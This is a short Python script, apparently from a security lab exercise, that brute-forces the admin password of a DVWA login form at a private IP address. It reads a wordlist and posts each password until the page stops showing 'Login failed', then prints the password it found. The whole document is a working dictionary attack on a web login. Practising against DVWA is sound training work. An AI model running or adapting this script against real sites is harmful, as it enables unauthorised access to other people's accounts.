#!/usr/bin/env python

import requests

target_url = "http://10.0.2.14/dvwa/login.php"

#data_dict = {"username": "blabla", "password": "123", "Login": "submit"}
data_dict = {"username": "admin", "password": "", "Login": "submit"}

#print(response)
#print(response.content)

with open("/root/passwords.txt", "r") as wordlist_file:
	for line in wordlist_file:
		word = line.strip()
		data_dict["password"] = word
		response = requests.post(target_url, data = data_dict)
		if "Login failed" not in response.content:
			print("[+] Got the password ==> " + word)
			exit()

print("[+] Reached end of line.")

